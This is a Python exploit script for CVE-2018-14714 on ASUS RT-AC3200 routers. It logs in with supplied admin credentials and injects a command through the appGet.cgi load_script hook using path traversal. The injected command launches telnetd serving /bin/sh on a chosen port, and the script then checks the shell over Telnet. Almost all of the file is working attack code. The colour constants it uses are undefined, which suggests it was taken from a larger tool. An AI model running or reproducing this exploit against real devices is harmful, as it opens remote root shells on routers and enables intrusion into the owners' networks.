#!/usr/bin/env python3

# Usage:
# ./asus_exploit.py <target host> <target port> <admin username> <admin password>
# ./asus_exploit.py 192.168.1.1 80 admin password

import requests
import base64
import os, sys, subprocess
from telnetlib import Telnet

def ASUS_RT_AC3200_CVE_2018_14714(victim_ip):
    try:
        # perform RCE and check if payload sent successfully
        exploit_result = os_command_injection(victim_ip)
        if exploit_result:
            return G+'CVE-2018-14714 exploit successful!  A telnet service has been started on your chosen port.'+W
        else:
            return R+'CVE-2018-14714 exploit failed!'+W
    except KeyboardInterrupt:
        print('\n' + 'Program exiting...')
        sys.exit()


def os_command_injection(victim_ip):
    port = 80
    telnet_port = input("Enter port to start telnetd on: ")
    url = 'http://' + victim_ip
    username = input("Enter Asus Router Username: ")
    password = input("Enter Asus Router Password: ")
    credentials = username + ':' + password
    credentials = credentials.encode()

    try:
        # send a POST request and detect if payload is sent successfully
        s = requests.Session()

        s.post(url + '/login.cgi',
               headers={'Referer': url + '/Main_Login.asp'},
               data={'login_authorization': base64.b64encode(credentials)})

        response = s.get(
            url + '/appGet.cgi?hook=load_script("../usr/sbin/telnetd+-l+/bin/sh+-p+' + telnet_port + '")')

        #response_status = int(subprocess.getoutput("lsof -i:"+telnet_port+" | grep {} | grep 'ESTABLISHED' | wc | awk ' {{print $1}}'".format(victim_ip)))
        #print(response_status)
      
        tn = Telnet(victim_ip, int(telnet_port))
        tn.write(('\r\n').encode('ascii'))
        telnet_status = int(subprocess.getoutput("lsof -i:{} | grep 'ESTABLISHED' | wc | awk '{{print $1}}'".format(telnet_port)))
        tn.close()
        
        if telnet_status ==  1: 
        #if response_status == 1:
            return True
        else:
            return False
    except:
        e = sys.exc_info()[1]
        print(R+"Error: %s" % e +W)
        return False



